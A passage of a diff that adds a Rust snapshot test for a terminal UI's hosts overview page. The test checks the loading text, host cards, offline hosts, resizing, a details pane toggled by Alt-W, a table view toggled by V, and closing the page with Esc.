+/// disk, watcher and containers, offline hosts on one line, the selected host's facts beside the
+/// cards once Alt-W gives them half the width, and a table when V asks for one.
+#[test]
+fn hosts_show_a_card_for_each_paired_host() -> Result<()> {
+    let mut stage = stage(GridSize { cols: 120, rows: 32 }, Motion::STILL)?;
+    stage.send(Msg::Pointer(borg_core::Pointer::Action(borg_core::Action::HostsOverview)));
+    let buffer = stage.render(stage.started + Duration::from_secs(2))?;
+    ensure_text(&buffer, "Reading the paired hosts")?;
+    check("hosts_loading", &stage, buffer)?;
+
+    send_hosts(&mut stage)?;
+    let at = stage.started + Duration::from_secs(40);
+    let buffer = stage.render(at)?;
+    ensure_text(&buffer, "Offline: old-nas · test-trash, seen")?;
+    ensure_text(&buffer, "Not answering for 30 seconds")?;
+    ensure_text(&buffer, "40 seconds old")?;
+    check("hosts_cards", &stage, buffer)?;
+
+    stage.send(Msg::Resize { cols: 80, rows: 24 });
+    let buffer = stage.render(at)?;
+    anyhow::ensure!(stage.state.hosts.columns() == Some(2), "80 cells fit two cards");
+    check("hosts_cards_80", &stage, buffer)?;
+
+    stage.send(Msg::Resize { cols: 120, rows: 32 });
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT)));
+    let buffer = stage.render(at)?;
+    anyhow::ensure!(!stage.state.hosts.expanded, "Alt-W shows the facts beside the cards");
+    ensure_text(&buffer, "older than this Borg")?;
+    check("hosts_details", &stage, buffer)?;
+
+    stage.send(Msg::Key(KeyEvent::new(KeyCode::Char('w'), KeyModifiers::ALT))).send(key(KeyCode::Char('v')));
+    let buffer = stage.render(at)?;
+    anyhow::ensure!(stage.state.hosts.columns().is_none(), "V shows the hosts as rows");
+    ensure_text(&buffer, "old-nas")?;
+    check("hosts_rows", &stage, buffer)?;
+
+    stage.send(key(KeyCode::Esc));
+    anyhow::ensure!(!stage.state.hosts.is_open(), "Esc closes the page");
+    Ok(())
 }
